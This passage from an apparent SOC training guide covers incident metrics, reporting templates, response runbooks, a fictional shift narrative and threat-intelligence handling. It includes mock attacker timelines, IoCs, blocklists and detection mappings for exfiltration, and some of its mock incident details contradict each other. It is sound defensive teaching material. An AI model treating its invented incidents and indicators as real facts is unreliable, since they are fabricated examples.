7. **Handoff** — if escalated, complete a triage summary so Tier 2 doesn't restart.

## 11.7 Alert vs Incident

| Aspect | Alert | Incident |
|---|---|---|
| **Definition** | A notification that a rule/hypothesis matched | A confirmed security event with actual or potential impact |
| **Confidence** | Unvalidated | Validated (or high-confidence) |
| **Action** | Triage → confirm → escalate or close | Full investigation + containment + remediation |
| **Example** | "10 failed logons from IP X" | "Account r.johnson was taken over and used to steal financial records" |
| **Lifecycle** | Short; minutes to hours | Longer; hours to weeks |
| **Seniority** | Tier 1 | Tier 2/3 + IR team |

---

# 12. Metrics & Reporting

## 12.1 SOC KPIs (Key Performance Indicators)

| KPI | Definition | Why it matters |
|---|---|---|
| **MTTD** | Mean time to detect | Measures detection speed; lower = less attacker dwell |
| **MTTR** | Mean time to respond | Measures response speed; lower = less impact |
| **MTTA** | Mean time to acknowledge | Measures queue responsiveness |
| **FPR** | False positive rate | Measures detection quality; high FPR = alert fatigue |
| **Dwell time** | Attacker presence before detection | Board-friendly "how long were we exposed" number |
| **Detection coverage** | % of priority ATT&CK techniques with detection | Measures defense completeness |
| **Incident volume** | Incidents per period by severity | Trend for risk posture |
| **Ticket backlog** | Open/past-due tickets | Operations health |
| **SLA compliance** | % of alerts meeting response SLAs | Accountability |

### Mock KPI table (monthly)

| KPI | June | July | Target | Trend |
|---|---|---|---|---|
| MTTD (median) | 3h 05m | 1h 47m | < 2h | improving |
| MTTR (median) | 5h 12m | 3h 12m | < 4h | improving |
| MTTA (median) | 12 min | 8 min | < 15 min | stable-good |
| FPR | 21% | 15.7% | < 15% | improving |
| Dwell time (median) | 12 d | 6 d | < 7 d | improving |
| Coverage (priority techniques) | 55% | 60% | 65% | improving |
| Alerts/day | 104 | 87 | < 90 | improving |
| Incidents (P1/P2) | 9 | 11 | — | neutral (more detections = more confirmed) |

## 12.2 Executive vs Technical Reporting

### Executive report (board-level)

**Purpose:** status, risk, resources. **Language:** business terms, trends, visuals. **Cadence:** monthly/quarterly.

```text
MONTHLY SECURITY METRICS — August 2026 (Executive Summary)
Prepared by: SOC Manager    Distribution: CISO, CIO, Board

KEY NUMBERS
  - Security incidents detected: 142 confirmed (17 P1/P2, 125 low)
  - No reportable data breach this month
  - Median time to detect a threat: 1h 47m (target < 2h)   [improving]
  - Median time to contain: 3h 12m (target < 4h)           [improving]
  - Average attacker dwell time: 6 days (target < 7)        [improving]

HIGHLIGHTS
  - Detected and contained an account-takeover campaign
    targeting Finance in under 4 hours; no data loss.
  - Expanded cloud monitoring to all 3 AWS accounts.
  - Reduced false positives 21% -> 15.7% through rule tuning.

RISKS / REQUESTS
  - Alert queue occasionally over SLA during overnight shifts
    -> recommend adding 1 overnight analyst ($85k/yr).
  - 40% of endpoints still lack Sysmon coverage -> recommend
    rollout budget of $12k for imaging time.
```

### Technical report (SOC/engineering)

**Purpose:** detail, actionability. **Language:** technical. **Cadence:** weekly.

```text
WEEKLY SOC TECHNICAL REPORT — Week 32
1. ALERT STATS
   - Total alerts: 612 | True positive: 142 | FP: 96 | Benign: 374
   - FP rate 15.7% (target <15%). Main FP source: DET-1010 allowlist gap.
2. INCIDENTS THIS WEEK
   - INC-2441 P2: Brute force -> account takeover (Finance). Contained 3h12m.
     Root cause: no MFA on finance VPN users. Action: MFA rollout to finance
     prioritized, ETA 2 weeks.
   - INC-2440 P3: Phishing, no creds, user re-trained.
   - INC-2444 P3: GuardDuty AnomalousAPI on svc-cicd key -> rotated, key policy.
3. DETECTION ENGINEERING
   - Deployed: "SMB Admin Share Access" (Sigma) detect-only.
   - Tuned: DET-1010 threshold 10->20, -72% FP.
   - Pending: "PowerShell Obfuscation" review — 40% FP from finance scripts.
4. HUNTING
   - HUNT-2026-014 (SMB admin share): 1 real finding (part of INC-2441),
     2 false leads, 1 coverage gap (Sysmon rollout).
5. THREAT INTEL
   - New campaign: TA-302 using updated Qakbot variants (JA3 changed).
   - Updated blocklists: 214 IPs, 87 domains.
```

## 12.3 SLA Management

| Practice | Description |
|---|---|
| **Define SLAs by severity** | Fixed, published, measured |
| **Track in the case tool** | Automatic SLA timers on every alert |
| **Review breaches weekly** | Root-cause each breach (staffing, rule, tooling) |
| **Escalate breaches** | Overdue P1/P2 auto-flag to manager |
| **Report monthly** | SLA % trends to management |

## 12.4 Tuning Reports

Tuning reports justify changes and measure their effect. They show the *before/after* of every tuning action.

### Mock tuning report format

```text
RULE TUNING REPORT — DET-1010 "Excessive Failed Logons"
DATE: 2026-08-01          AUTHOR: A. Chen (T1) + M. Osei (T3)

CHANGE MADE
  - Threshold: 10 failed logons / 5 min -> 20 / 10 min
  - Allowlist added: SVC-MONITORING, WAF health check IPs
  - Dedup: same src_ip, 1 alert / 10 min

RATIONALE
  - 93% FP driven by the two allowlisted sources + service typos.

BEFORE (July)                       AFTER (projected)
  Alerts:  1,242/month              Alerts:  ~180/month  (-85%)
  FP rate: 93%                      FP rate: ~35%
  Analyst time: ~35 hrs/month       Analyst time: ~5 hrs/month

RISK
  - Slightly higher threshold could miss a slow, low-and-slow spray
    (10-19 attempts / 10 min). Mitigation: separate low-and-slow rule
    with 24h window at medium severity.
```

---

# 13. SOC Playbooks & Runbooks

A **runbook** is a step-by-step human guide for handling a scenario. A **playbook** is the automated (SOAR) version (§7). This section provides practical runbooks with mock data.

## 13.1 Phishing Runbook

**Goal:** Detect, contain, and remediate a phishing campaign, protecting users and creds.

| Step | Action | Owner | Time |
|---|---|---|---|
| 1 | **Triage** the report/alert: user reported, email gateway alerted, or URL detonated | Tier 1 | 0–5 min |
| 2 | **Collect the email**: subject, sender, recipients, headers, links, attachment hash | Tier 1 | 5–10 min |
| 3 | **Analyze**: scan links (URLScan/VT), detonate attachment in sandbox (if safe), check sender reputation | Tier 1/2 | 10–30 min |
| 4 | **Contain email**: quarantine all copies (same sender/subject/hash) from all mailboxes; block sender + URLs in gateway | Tier 1 | 15–30 min |
| 5 | **Identify recipients** and check if any clicked / entered creds (gateway + AAD sign-ins) | Tier 2 | 30–60 min |
| 6 | **If creds were submitted**: force password reset + revoke sessions + enforce MFA; watch for use | Tier 2 | < 1 hr |
| 7 | **If attachment executed**: isolate host, run EDR sweep, collect memory/artifacts | Tier 2 | < 1 hr |
| 8 | **Notify** affected users (re-training, awareness message) | Comms | < 4 hrs |
| 9 | **Update intel**: add sender/domain/hash to blocklists; update rule | Tier 3 | < 24 hrs |
| 10 | **Document** incident + tuning notes | All | on close |

### Mock phishing incident timeline

```text
PHISHING INCIDENT — INC-2440
11:02  User r.johnson forwards suspicious "Invoice #8842 - Overdue" to report-phish.
11:04  Tier 1 triages; URL hxxp://185.244.25.198/verify-login resolves to fake O365 page.
11:07  VT: URL malicious (42/72). Attachment "Invoice-8842.zip" -> sandbox -> Agent Tesla dropper.
11:09  Gateway blocks sender + URL; quarantine action removes email from 14 inboxes.
11:15  Sign-in logs: 1 user (s.patel) entered password 3 min after clicking.
11:20  s.patel password reset, sessions revoked, MFA enforced; monitoring for use.
11:25  EDR sweep of s.patel workstation -> clean (no attachment execution).
12:00  Users notified; training reminder scheduled.
13:30  IoCs published to blocklists. Incident closed P3.
```

## 13.2 Malware / Malicious Execution Runbook

**Goal:** contain a suspected infection on one or more hosts and determine scope.

| Step | Action | Owner |
|---|---|---|
| 1 | **Acknowledge + assess**: which host(s), which process(es), which user | Tier 1 |
| 2 | **Confirm**: is it a known-bad hash/behavior, or needs analysis? | Tier 1/2 |
| 3 | **Contain host**: isolate in EDR (network + storage), or disconnect via NAC | Tier 1/2 |
| 4 | **Preserve evidence**: collect memory dump, triage image, logs (Sysmon, EDR) | Tier 2 |
| 5 | **Analyze**: hash lookup, sandbox detonation, static/memory analysis (Tier 3) | Tier 2/3 |
| 6 | **Find scope**: search for same hash, parent-child chains, C2 IPs across estate | Tier 2/3 |
| 7 | **Eradicate**: remove persistence (services, run keys, scheduled tasks), kill processes, clean files | Tier 2 + IT |
| 8 | **Restore**: reimage if needed; verify with post-infection scan | IT |
| 9 | **Verify C2**: block C2 IPs/domains at firewall; alert if host re-connects | Tier 2 |
| 10 | **Document + update detections** | All |

## 13.3 Insider Threat Runbook

**Goal:** handle suspected malicious or accidental insider activity with care (legal, HR involvement).

| Step | Action | Owner |
|---|---|---|
| 1 | **Validate** the report/alert (monitoring, DLP, or colleague report) — do not accuse prematurely | Tier 1/2 |
| 2 | **Collect objective evidence**: access logs, DLP flags, file copies, emails, USB events | Tier 2 |
| 3 | **Rule out false positive / compromised account** — an account anomaly may be an attacker, not an insider | Tier 2 |
| 4 | **Involve HR + Legal** before any confrontation or account action (per policy) | SOC Manager / IR Lead |
| 5 | **Preserve evidence** with chain-of-custody (imaging, supervised access) | Tier 2/3 |
| 6 | **Escalate/contain** per HR/Legal direction: suspend account, revoke access, monitor | HR/Legal + IT |
| 7 | **Document thoroughly** — insider cases may lead to termination or legal action | All |
| 8 | **Post-incident**: improve DLP, monitoring, and least-privilege reviews | Tier 3 |

> **Key principle:** Insider threats are personnel matters as much as security matters. The SOC gathers facts and evidence; HR/Legal make personnel decisions.

## 13.4 Ransomware Runbook

**Goal:** stop the spread, preserve evidence, restore operations, and (if applicable) coordinate with law enforcement.

### Immediate actions (first 15 minutes)

| Step | Action | Owner |
|---|---|---|
| 1 | **Confirm** ransomware: ransom note, `.encrypted` file mass-rename, encryption event bursts, TOR connection | Tier 1/2 |
| 2 | **Declare P1** — notify IR lead and management immediately | Tier 1 |
| 3 | **Preserve evidence FIRST** (before containment): snapshot memory/disk of affected host(s), capture ransom note | Tier 2 |
| 4 | **Contain — kill lateral movement** (order matters, don't alert the adversary too early): | |
|   | a. Disable compromised accounts / force-reset creds | Tier 2 |
|   | b. Disconnect affected segment(s) from network | IT/SOC |
|   | c. Disable admin shares + SMB on critical servers (temporarily) | IT |
|   | d. Block known C2/tooling IoCs at perimeter | Tier 2 |
| 5 | **Scope**: how many hosts/accounts affected? which backups exist? | Tier 2/3 |

### Recovery phase

| Step | Action | Owner |
|---|---|---|
| 6 | **Determine if backups are clean** and offline (never restore over a live infection) | IT + IR |
| 7 | **Contain/eradicate** across scope: reimage or clean hosts, remove persistence | IT + Tier 2 |
| 8 | **Restore** from known-clean backups; validate integrity of restored data | IT |
| 9 | **Rebuild credentials** (all domain + service accounts potentially exposed) | IT + IR |
| 10 | **Notify**: legal counsel, law enforcement (FBI/CISA), regulators if required | IR Lead / CISO |
| 11 | **Post-incident**: root-cause review, close detection gaps, update runbook | All |

### Mock ransomware incident summary

```text
RANSOMWARE INCIDENT — INC-2450 (P1)
2026-08-05 03:00  EDR bursts: 400+ mass file renames to .encrypted on FIN-APP-04.
2026-08-05 03:02  Analyst confirms ransom note: "READ_ME_REDACTED.txt" + payment URL (TOR).
2026-08-05 03:05  P1 declared. Memory + disk images taken of FIN-APP-04 (2 TB).
2026-08-05 03:12  FIN segment disconnected at core; admin share SMB disabled on critical.
2026-08-05 03:20  Account r.johnson (compromised via phishing earlier) disabled; password
                  resets for finance domain initiated. 12 hosts found encrypted in scope.
2026-08-05 06:00  Clean offline backups confirmed for 11/12 hosts.
2026-08-05 09:00  Restoration started; RPO = previous night's backup (max 1 day data loss).
2026-08-06 12:00  All restored. No ransom paid. Law enforcement notified. Full root-cause
                  review scheduled.
```

### Do / Don't quick reference

| Do | Don't |
|---|---|
| Preserve evidence before containing | Pay the ransom (encourages attackers; no guarantee) |
| Disconnect segments, not just hosts | Reboot/restore over an active infection |
| Use clean, offline backups | Delete the ransom note or encrypting binaries before analysis |
| Notify leadership + legal early | Panic-destroy disk images |
| Rebuild credentials after restoration | Assume one host = the whole story |

---

# 14. Mock SOC Day-in-the-Life

A realistic narrative of one shift in the fictional **Northwind SecOps** SOC — 5,000 endpoints, 3 AWS accounts, 300 network devices. Cast: **A. Chen** (Tier 1, Swing shift 15:00–23:00), **M. Osei** (Tier 1), **J. Park** (Tier 2), **M. Ibrahim** (Tier 3).

---

## Shift start: handover (15:00)

A. Chen and M. Osei come on for the swing shift and read the handover from days:

- **INC-2441** (P2, account takeover on Finance) — active; host WS-FIN-078 isolated, r.johnson account disabled; Tier 2 investigating.
- **ALERT-88912** (47 failed RDP logins from 10.66.3.0/24) — needs review.
- **ALERT-88914** (first-time scheduled task on DC-02 at 03:11) — needs review.
- VirusTotal feed degraded; fallback to OTX working.

**15:05** — M. Osei acknowledges the two hot alerts to start SLA clocks.

---

## 15:08 — Alert triage: ALERT-88912 (RDP brute force)

**Alert:** 47 failed RDP logons (Event 4625, LogonType 10) from `10.66.3.0/24` in the last hour against WEB-SRV-12.

**Triage steps:**
1. Raw events: 47 × `4625` from `10.66.3.41` (a single host, not the whole subnet) — the alert's subnet field was misleading.
2. Enrich: `10.66.3.41` is in the **unassigned VLAN 66**, no asset record in CMDB. Account targeted: `administrator`.
3. Context: is a new build being deployed? Check with NetSec: "no one is in VLAN 66 today."

**Decision:** True positive (suspicious). Severity P3 → the target is a public web server, brute force is common noise from scanners, but an *internal* IP attacking means the source is inside the network. Escalated to Tier 2 with a note to pivot on `10.66.3.41` (find which switch port/AP it's on).

**15:22** — J. Park (Tier 2) picks it up, checks the switch, finds the port is a *disconnected* wall jack that recently came alive — an attacker physically connected to the LAN. NAC quarantines the port. New lead for INC-2441's investigation (this may be the same actor staging).

---

## 15:45 — Alert: ALERT-88914 (scheduled task on DC-02)

**Alert:** First-time scheduled task created on DC-02 at 03:11 (Event 4698).

**Triage:**
1. Task name: `WindowsCacheCleanup`. Path: `C:\Windows\Temp\cachecln.ps1`.
2. Creator: `NORTHWIND\svc-backup` — but svc-backup's job is backup, not domain controllers.
3. Check with server team: "No one created a scheduled task on DC-02."

**Decision:** Escalate to P2 immediately — scheduled task on a domain controller + suspicious path + unauthorized creator = persistence technique (T1053.005). J. Park checks the PS1: it's a base64-obfuscated PowerShell dropper. DC-02 isolated, domain-account password reset initiated (SMB hash theft risk). This confirms the Finance compromise is **environment-wide**, not isolated.

---

## 16:30 — Queue review & false positive

A. Chen works the queue backlog:
- **ALERT-88921** "Excessive Failed Logons" from `SVC-MONITORING` — **FP**. The service account retries a dead database every hour (12 failures/hr). Allowlisted + tuning note.
- **ALERT-88925** "Port Scan Detected" from `10.0.14.77` — **FP**. Confirmed it's NetSec's own NMAP host (they scan every Monday; rule has a suppression window but the window ends at 16:00). Re-add suggestion for wider window.
- **ALERT-88930** "New User Created" (`UserCreated` 4720) — **FP**. It's the temp HR consultant account `hr-temp01`, provisioned through the approved IT ticket `REQ-55210`.

**16:50** — Queue updated; FP rate for the shift holding at ~14%.

---

## 17:15 — Threat intel alert: matching a C2 domain

The OTX feed (fallback for VT) flags a domain resolution: `update-secure-now[.]net`, resolved by host **WS-FIN-078** at 02:12 — *the isolated host from INC-2441*.

J. Park pulls the full timeline for WS-FIN-078:

| Time | Event |
|---|---|
| 02:11:03 | WINWORD.EXE spawns `svchost-cache.exe` from Temp (Sysmon 1) |
| 02:11:22 | PowerShell 4104: base64 download of `x.ps1` from `185.220.101.4` |
| 02:11:25 | `svchost-cache.exe` → `91.208.31.99:443` (Sysmon 3) |
| 02:12:01 | DNS: `update-secure-now[.]net` → `185.244.25.198` (Sysmon 22) |
| 02:14:19 | AWS CloudTrail: `AttachUserPolicy` AdministratorAccess to `finance-admin` from `91.208.31.99` |
| 02:16:00 | GCP SCC: EXCESSIVE_PERMISSIONS on `db-01` |

**Full kill chain reconstructed:** Phishing macro → dropper → C2 beacon → credential theft → cloud IAM escalation. This is a **P1** now — data exfiltration suspected across three cloud environments.

---

## 17:40 — P1 bridge opens

M. Ibrahim (Tier 3) joins, IR Lead briefs management, and the bridge works three tracks:

1. **Containment** — AWS: revoke `finance-admin` + `svc-cicd` keys, detach admin policies, rotation everywhere. Azure: conditional-access block for `r.johnson`. On-prem: domain password reset for all Finance + service accounts.
2. **Evidence** — memory images of WS-FIN-078 taken pre-isolation; CloudTrail exports pulled to archive; Zeek conn/dns logs saved.
3. **Scope** — hunt for other hosts resolving `update-secure-now[.]net` or contacting `91.208.31.99`:

```kql
Sysmon
| where EventID == 22 and QueryName has "update-secure-now"
    or (EventID == 3 and DestinationIp == "91.208.31.99")
| project TimeGenerated, Computer, User, QueryName, DestinationIp, DestinationPort
```

Result: **2 additional hosts** (WS-ACC-331, WS-HR-014) resolved the domain — same phishing email distribution list. Both isolated.

---

## 18:30 — Routine monitoring

With the P1 underway, M. Osei continues routine work:
- CloudGuard dashboard: 3 AWS findings (1 public S3 bucket in dev → closed as known/ignored with ticket to fix; 2 low-severity GuardDuty → noted).
- Email gateway: 2 new phishing catches, auto-quarantined by the SOAR playbook (PB-4471), no clicks — confirmed via sign-in logs.
- DNS anomaly review: the DGA-style `NXDOMAIN` burst from `10.10.7.42` — host investigated earlier, determined to be a misconfigured test box running a domain-scanning script (not DGA). Closing as benign.

---

## 21:45 — Shift handover prep

Summary prepared for the mids:

```text
HANDOVER — 2026-08-05 21:45  Swing -> Mids
Active incident: INC-2450 (P1) — multi-cloud account takeover / possible data exfiltration.
  Status: contained (hosts isolated, creds rotated, cloud access revoked). Forensics ongoing.
  Next actions: review CloudTrail for post-02:14 data-access events; await memory image analysis.
Open: INC-2441 (P2) merged into INC-2450. INC-2440 (P3 phishing) closed.
New lead: physical LAN jack (VLAN 66) — attacker present on-site or planted device. Security
  reviewing camera footage / badge logs. NAC port disabled.
Overnight queue: 3 P3 alerts pending triage (all benign categories). Feed: VT restored 19:10.
```

**22:10** — Mids take over. A. Chen's shift closes with: **2 incidents escalated, 1 P1 declared, 17 alerts triaged, FPR ~14%, all SLAs met.**

---

## Lessons from the day (mock)

| Lesson | Takeaway |
|---|---|
| **Triage led to a P1** | A "subnet brute force" alert turned out to be a physical presence — never dismiss internal sources |
| **Correlation across clouds caught the blast radius** | CloudTrail + SCC data on a single host revealed the full compromise |
| **Feed redundancy saved the day** | VT being down didn't blind the team (OTX fallback matched the C2 domain) |
| **FP discipline keeps the queue clean** | Allowlisting + tuning kept analysts free for the real incident |
| **Sysmon coverage gap was the lesson** | Only 40% of hosts had Sysmon — the P1 scope hunt had to rely on network-side (Zeek) data |

---

# 15. Threat Intelligence in the SOC

## 15.1 What Threat Intelligence Is

**Threat intelligence (TI)** is *analyzed information about adversaries, their capabilities, infrastructure, and intent* — turned into actionable security decisions. It's not just a feed of IPs and hashes; it's context that makes detection and response smarter.

### TI dimensions

| Dimension | What it is | Example |
|---|---|---|
| **Strategic** | Long-term trends and adversary intent, for leadership | "Ransomware groups are targeting finance teams via invoice-themed phishing" |
| **Operational** | Specific campaigns and attacker TTPs, for defenders | "TA-302 uses Qakbot, then Cobalt Strike, then hand-on-keyboard exfil via SMB shares" |
| **Tactical** | Immediate IoCs (IPs, domains, hashes, URLs) | "Block `update-secure-now[.]net` and `91.208.31.99`" |
| **Technical** | Signatures and detections | Sigma rules, Suricata signatures, YARA rules |

### The TI lifecycle

```
  Requirements -> Collection -> Processing -> Analysis -> Dissemination -> Feedback
       ^                                                                     |
       +---------------------------------------------------------------------+
```

1. **Requirements** — what does the SOC need to know (drive by leadership, incidents, gap analysis)?
2. **Collection** — feeds, OSINT, vendor intel, internal incident data.
3. **Processing** — normalize, deduplicate, score.
4. **Analysis** — turn data into insight (attribute to a group, map to ATT&CK).
5. **Dissemination** — push actionable intel to SIEM/EDR/analysts.
6. **Feedback** — did it help? refine requirements.

## 15.2 Intel Feeds

| Feed type | Examples (mock) | Value | Caveats |
|---|---|---|---|
| **Commercial** | Recorded Future, ThreatConnect, CrowdStrike Falcon Intel | High-quality, rich context | Cost; often overwhelming volume |
| **Community / free** | AlienVault OTX, MISP sharing groups, abuse.ch, MalwareBazaar | Cheap, useful IoCs | Quality varies; false-positive prone |
| **Government** | CISA advisories, NCSC bulletins | Authoritative on campaigns | Broad; not always timely |
| **Vendor / product** | Microsoft Threat Intel, Cisco Talos, Palo Alto Unit 42 | Tied to your stack | Vendor bias |
| **Internal** | Your own incidents, honeypots, hunting findings | Highest fidelity for *your* environment | Only covers what you've seen |

### Feed quality scoring (mock)

| Feed | IoCs/month | True-positive rate | Freshness (median) | Score |
|---|---|---|---|---|
| Commercial feed A | 8,400 | 78% | 4 h | 8.5/10 |
| OTX community | 42,000 | 34% | 24 h | 5.0/10 |
| CISA advisory | 120 | 92% | 12 h | 9.0/10 |
| Internal (own incidents) | 38 | 99% | immediate | 9.8/10 |

## 15.3 IoC Management

**IoCs (Indicators of Compromise)** are the atomic facts: IPs, domains, URLs, file hashes, email addresses, registry keys, JA3 fingerprints, certs.

### IoC types & half-life

| IoC type | Example | Typical half-life (how fast it goes stale) |
|---|---|---|
| File hash | `e3b0c442...b855` | Days (recompile changes it) |
| URL | `hxxp://185.244.25.198/verify-login` | Days–weeks |
| Domain | `update-secure-now[.]net` | Weeks |
| IP address | `91.208.31.99` | Days–weeks (fast flux) |
| JA3/JA4 | `4d7a28d6...` | Weeks–months |
| SSL cert / SNI | `CN=update-secure-now.net` | Months |
| TTP (behavior) | "phish macro → base64 PS → C2 over 443" | Long-lived (hardest to change) |

### IoC management process

| Stage | Activity |
|---|---|
| **Ingest** | Parse feeds into the TI platform/SIEM; dedupe |
| **Enrich** | Add context: ATT&CK, target sectors, confidence score |
| **Score** | Rank by confidence, recency, and relevance to your industry |
| **Deploy** | Push to blocklists (firewall, proxy, DNS), SIEM watchlists, EDR indicators |
| **Monitor** | Match IoCs against traffic/history; flag hits |
| **Expire** | Age out stale IoCs (per half-life) to avoid false positives |
| **Feedback** | Record which IoCs produced real detections |

### mock IoC record

```yaml
ioc:
  value: "update-secure-now[.]net"
  type: domain
  source: OTX + internal incident INC-2450
  confidence: 0.92
  first_seen: 2026-08-05T02:12:00Z
  last_seen: 2026-08-05T02:16:00Z
  tags: [qakbot, phishing, c2, t1105]
  ttp: [t1059.001, t1105, t1071.001]
  status: active
  expire_after: 2026-09-05T00:00:00Z
  sightings:
    - host: WS-FIN-078
    - host: WS-ACC-331
    - host: WS-HR-014
```

## 15.4 Intel-Driven Detection

Intel should drive *new detections*, not just blocklists. When a campaign report arrives, the SOC turns its TTPs into rules.

### Intel → detection translation (mock)

| Intel (from TA-302 report) | ATT&CK | Detection action |
|---|---|---|
| "Dropper reached via macro-enabled doc with same subject 'Invoice #8842'" | T1566.001 | Email rule on subject/sender; block attachment hash |
| "Base64-obfuscated PowerShell one-liner" | T1059.001 | Sigma "Obfuscated PowerShell" (§5.10) |
| "Calls back to port 443 to `.net` domain with low jitter" | T1071.001 | Beaconing correlation rule (§5.9) |
| "Uses `7z` to archive before exfil" | T1560.001 | Process rule: `7z.exe` creating archives on non-builder hosts |
| "Exfil over SMB admin share from a workstation" | T1021.002 | The SMB admin-share rule from HUNT-2026-014 |

### Watchlist vs blocklist

| Mechanism | Purpose | Used for |
|---|---|---|
| **Blocklist** | Prevent traffic to/from known-bad | High-confidence IoCs (hash, confirmed C2) |
| **Watchlist** | Alert when an IoC is seen (even if you can't block) | Lower-confidence, or IoCs you want to investigate (e.g., suspicious domain resolution) |

## 15.5 False Positive Reduction via Intel

Intelligence helps cut false positives in two directions:

1. **Add context to alerts** — a failed-login burst from an IP in your intel platform's "known scanning infrastructure" list gets auto-low severity, saving analysts from chasing bots.
2. **Deprioritize irrelevant IoCs** — a feed full of consumer-ware malware is irrelevant to a corporate environment; filter feeds by sector/geo relevance so watchlists stay clean.

### mock intel-assisted triage decision

```text
ALERT: Beaconing candidate — host WS-MKT-009, 40 connections to 185.244.25.198:443
Intel lookup: 185.244.25.198 = "honeypot sinkhole maintained by CERT-VULN" (confidence 0.97)
-> Benign (honeypot interference), auto-closed P5. Saves analyst time.
```
